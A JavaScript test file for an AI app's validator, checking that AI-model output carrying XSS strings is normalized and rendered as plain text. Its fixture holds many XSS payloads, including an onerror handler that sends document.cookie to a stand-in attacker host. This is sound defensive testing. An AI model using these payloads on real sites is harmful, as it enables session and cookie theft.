/**
 * SAARTHI AI — XSS Injection & Safe Rendering Tests
 */

const test = require('node:test');
const assert = require('node:assert');
const { validateAndNormalizeGeminiOutput } = require('../services/validate');

test('XSS Injection strings in model output are safely sanitized and normalized', () => {
  const maliciousInput = '<script>alert("pwned")</script><img src=x onerror=alert(1)>';
  
  const untrustedModelOutput = {
    title: '<script>alert("xss-title")</script>Title',
    intent: {
      said: '<b onmouseover=alert(1)>said</b>',
      trueIntent: '<script src="evil.js"></script>True Intent'
    },
    urgency: 'Immediate',
    confidenceScore: 0.95,
    domain: 'CIVIC',
    summary: '<img src=x onerror=fetch("http://attacker.com?c="+document.cookie)>',
    facts: ['<iframe src="javascript:alert(1)"></iframe>'],
    unknowns: ['<svg onload=alert(1)>'],
    conflicts: ['"><script>alert(1)</script>'],
    extractedEntities: {
      primaryIssue: '<script>alert("issue")</script>',
      symptoms: ['<img src="x" onerror="alert(1)">'],
      history: ['javascript:alert(1)'],
      risks: ['<a href="javascript:alert(1)">click me</a>'],
      locationContext: '<script>evil()</script>'
    },
    verification: [
      {
        claim: '<script>alert("claim")</script>',
        status: 'Unverified',
        evidence: [],
        explanation: '<img src=x onerror=alert(1)>'
      }
    ],
    actions: [
      {
        step: '<script>steal()</script>Action',
        why: '<b onclick=alert(1)>why</b>',
        timing: 'Immediate',
        priority: 'Critical',
        requiresHumanApproval: true
      }
    ],
    humanGuidance: ['<script>evil()</script>Step 1'],
    draftPayloads: [
      {
        targetSystem: '<script>hack()</script>',
        actionCode: 'CODE',
        priority: 'P1',
        payloadSummary: '<script>alert(1)</script>',
        sent: false
      }
    ],
    safety_note: '<script>alert("safety")</script>',
    follow_up_question: '<script>alert("question")</script>'
  };

  const normalized = validateAndNormalizeGeminiOutput(untrustedModelOutput, maliciousInput);

  // Assert all fields exist as raw sanitized strings, and never executed as HTML
  assert.strictEqual(typeof normalized.title, 'string');
  assert.ok(normalized.title.includes('Title'));
  assert.strictEqual(typeof normalized.summary, 'string');
  assert.strictEqual(typeof normalized.extractedEntities.primaryIssue, 'string');
  assert.strictEqual(typeof normalized.actions[0].step, 'string');

  // Verify that frontend UI renders these using textContent only
  // Simulated DOM node creation:
  const simNode = {
    textContent: '',
    innerHTML: ''
  };
  simNode.textContent = normalized.title;
  // Setting textContent treats HTML tags purely as text characters
  assert.strictEqual(simNode.textContent, normalized.title);
  assert.strictEqual(simNode.innerHTML, ''); // innerHTML was never assigned
});
